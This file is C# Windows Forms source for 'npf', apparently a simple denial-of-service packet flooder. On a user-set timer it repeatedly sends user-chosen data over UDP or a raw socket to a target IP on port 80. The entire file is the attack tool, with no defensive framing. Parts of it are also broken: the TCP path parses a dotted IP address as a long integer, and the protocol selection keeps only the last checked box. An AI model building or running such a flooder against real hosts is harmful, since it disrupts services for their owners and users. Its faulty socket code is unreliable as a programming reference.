﻿using System;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Windows.Forms;
using System.Net.NetworkInformation;

namespace npf
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }
        private void textBox1_TextChanged(object sender, EventArgs e) // i really dont need this but for some reason the program breaks if i remove it so i have to keep it here
        {

        }
        
        private void button1_Click(object sender, EventArgs e)
        {
            string intervall = intervalTxt.Text;
            int value;
            if (int.TryParse(intervall, out value))
            {
                bool internetcon = CheckForInternetConnection(); // this checks the internet connection
                if (internetcon)
                {
                    floodTimer.Interval = Int16.Parse(intervalTxt.Text);
                    if (floodTimer.Enabled)
                    {
                        MessageBox.Show("Flooding is still in progress.");
                    }
                    else
                    {
                        MessageBox.Show("Flooding started.");
                        floodTimer.Start();
                    }
                }
                else
                {
                    MessageBox.Show("You do not have an internet connection, reconnect and try again.");
                    System.Windows.Forms.Application.Exit();
                }
            }
            else
            {
                MessageBox.Show("Incorrect interval. Please enter an integer.");
            }
        }

        private void button2_Click(object sender, EventArgs e)
        {
            if (floodTimer.Enabled)
            {
                MessageBox.Show("Flooding stopped.");
                floodTimer.Stop();
            }
            else
            {
                MessageBox.Show("Flooding hasn't started yet, therefore nothing has been stopped.");
            }
        }
        public static bool CheckForInternetConnection() // this checks for internet
        {
            try
            {
                using (var CheckClient = new WebClient())
                using (CheckClient.OpenRead("http://google.com/generate_204"))
                    return true;
            }
            catch
            {
                return false;
            }
        }
        public static string GetLocalIPAddress() //this gets the local ip address for binding the tcp connection
        {
            var host = Dns.GetHostEntry(Dns.GetHostName());
            foreach (var ip in host.AddressList)
            {
                if (ip.AddressFamily == AddressFamily.InterNetwork)
                {
                    return ip.ToString();
                }
            }
            throw new Exception("Failed to parse local IP address. Check if there are network adapters with an IPv4 address in the system.");
        }

        private void floodTimer_Tick(object sender, EventArgs e)
        {
            if (ProtocolBox.CheckedItems.Count != 0)
            {
                //looped through all checked items and show results.
                string s = "";
                for (int x = 0; x < ProtocolBox.CheckedItems.Count; x++)
                {
                    s = ProtocolBox.CheckedItems[x].ToString();
                }
                if (s == "UDP")
                {
                    floodUdp();
                }
                else if (s == "TCP")
                {
                    floodTcp();
                }
                else
                {
                    MessageBox.Show("Please make sure you checked at least 1 box.");
                    floodTimer.Stop();
                }
            }
        }
        private void floodUdp() // all the upcoming code happens every second or so
        {
            string ipaddr = IPText.Text;
            var checkedudp = CheckIP(ipaddr);
            UdpClient client = new UdpClient(); // this is just the udp client, nothing interesting
            if (checkedudp)
            {
                try
                {
                    client.Connect(ipaddr, 80); // this is where the fun starts 
                    byte[] sendBytes = Encoding.ASCII.GetBytes(DataText.Text);
                    client.Send(sendBytes, sendBytes.Length); // this actually sends the packet
                    client.AllowNatTraversal(true);
                    client.DontFragment = true;
                }
                catch
                {
                    const string errorMessage = "There was an error with npf.";
                    const string errorCaption = "Ensure that you have an internet connection and that all the data is entered correctly.";
                    MessageBox.Show(errorMessage, errorCaption,
                        MessageBoxButtons.OK);
                    floodTimer.Stop();
                }
            }
            else
            {
                MessageBox.Show("The IP address is invalid or cannot be pinged at this time. Please enter a valid IP address");
                floodTimer.Stop();
            }
        }
        
        public static bool CheckIP(string nameOrAddress) // this pings the ip to make sure it is correct
        {
            bool pingable = false;
            Ping pinger = null;

            try
            {
                pinger = new Ping();
                PingReply reply = pinger.Send(nameOrAddress);
                pingable = reply.Status == IPStatus.Success;
            }
            catch (PingException)
            {
                // Discard PingExceptions and return false;
            }
            finally
            {
                if (pinger != null)
                {
                    pinger.Dispose();
                }
            }

            return pingable;
        }

        private void floodTcp() // just floodudp but for tcp
        {
            string ipaddr = IPText.Text;
            long ipaddrtcp = long.Parse(ipaddr);
            string localhost = GetLocalIPAddress();
            long localhosttcp = long.Parse(localhost);
            var checkip = CheckIP(ipaddr);
            TcpClient client = new TcpClient(); // this is just the tcp client, nothing interesting
            if (checkip)
            {
                try
                {
                    using (Socket sock = new Socket(AddressFamily.InterNetwork, SocketType.Raw, ProtocolType.IP))
                    {
                        sock.Bind(new IPEndPoint(localhosttcp, 80)); // this binds to the local ip address
                        byte[] data = Encoding.ASCII.GetBytes(DataText.Text);
                        sock.SendTo(data, new IPEndPoint(ipaddrtcp, 80)); // this sends the tcp packet
                    }
                }
                catch
                {
                    const string errorMessage = "There was an error with npf.";
                    const string errorCaption = "Ensure that you have an internet connection and that all the data is entered correctly.";
                    MessageBox.Show(errorMessage, errorCaption,
                        MessageBoxButtons.OK);
                }
            }
            else
            {
                MessageBox.Show("The IP address is invalid or cannot be pinged at this time. Please enter a valid IP address");
                floodTimer.Stop();
            }
        }
    }
}